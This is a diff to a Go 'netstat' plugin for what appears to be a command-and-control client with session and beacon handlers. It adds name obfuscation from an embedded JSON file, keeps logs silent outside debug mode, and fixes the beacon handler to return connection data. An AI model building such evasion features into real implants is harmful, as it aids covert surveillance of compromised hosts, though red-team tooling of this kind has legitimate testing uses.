@@ -1,13 +1,15 @@
 package main
 
 import (
+	_ "embed"
+	"encoding/json"
 	"fmt"
 	"io"
 	"sort"
 	"strings"
 
-	Logger "src/Client/generic/logger"
 	"src/Client/generic/config"
+	Logger "src/Client/generic/logger"
 
 	gnet "github.com/shirou/gopsutil/v3/net"
 	"github.com/shirou/gopsutil/v3/process"
@@ -18,17 +20,38 @@ import (
 	"github.com/hashicorp/go-plugin"
 )
 
-var pluginName = "netstat"
+//go:embed obfuscate.json
+var obfuscateJSON []byte
+
+var pluginName string
+
+const pluginKey = "netstat"
+
+func init() {
+	pluginName = pluginKey
+
+	type entry struct {
+		ObfuscatedName string `json:"obfuscated_name"`
+	}
+	var m map[string]entry
+	if err := json.Unmarshal(obfuscateJSON, &m); err == nil {
+		if e, ok := m[pluginKey]; ok {
+			if n := strings.TrimSpace(e.ObfuscatedName); n != "" {
+				pluginName = n
+			}
+		}
+	}
+}
 
 type connectionInfo struct {
-	Proto          string `json:"proto"`
-	LocalAddress   string `json:"local_address"`
-	LocalPort      uint32 `json:"local_port"`
-	RemoteAddress  string `json:"remote_address"`
-	RemotePort     uint32 `json:"remote_port"`
-	State          string `json:"state"`
-	PID            int32  `json:"pid"`
-	ProcessName    string `json:"process"`
+	Proto         string `json:"proto"`
+	LocalAddress  string `json:"local_address"`
+	LocalPort     uint32 `json:"local_port"`
+	RemoteAddress string `json:"remote_address"`
+	RemotePort    uint32 `json:"remote_port"`
+	State         string `json:"state"`
+	PID           int32  `json:"pid"`
+	ProcessName   string `json:"process"`
 }
 
 // --- Collection helpers ---
@@ -149,22 +172,22 @@ func (c *NetstatCommand) ExecuteFromSession(args []string) (string, error) {
 
 func (c *NetstatCommand) ExecuteFromBeacon(args []string, data string) (string, error) {
 	Logger.Log(fmt.Sprintf("NetstatCommand.ExecuteFromBeacon called with data: %s", data))
-	data, err := c.Execute(args)
+	out, err := c.Execute(args)
 	if err != nil {
 		Logger.Error(fmt.Sprintf("Error executing netstat info in beacon context: %v", err))
 		return "", err
 	}
 	Logger.Log(fmt.Sprintf("Beacon data received: %s", data))
-	return fmt.Sprintf("--- Netstat Info (Beacon Context) ---\nBeacon Data: %s\n------------------------------------", data), nil
+	return fmt.Sprintf("--- Netstat Info (Beacon Context) ---\nBeacon Data: %s\n%s\n------------------------------------", data, out), nil
 }
 
 func main() {
 	// Silence plugin logs unless in debug
 	var plog hclog.Logger
 	if config.IsDebug() {
-		plog = hclog.New(&hclog.LoggerOptions{ Name: "plugin.netstat", Level: hclog.Debug })
+		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin." + pluginName, Level: hclog.Debug})
 	} else {
-		plog = hclog.New(&hclog.LoggerOptions{ Name: "plugin.netstat", Level: hclog.Off, Output: io.Discard })
+		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin." + pluginName, Level: hclog.Off, Output: io.Discard})
 	}
 
 	plugin.Serve(&plugin.ServeConfig{
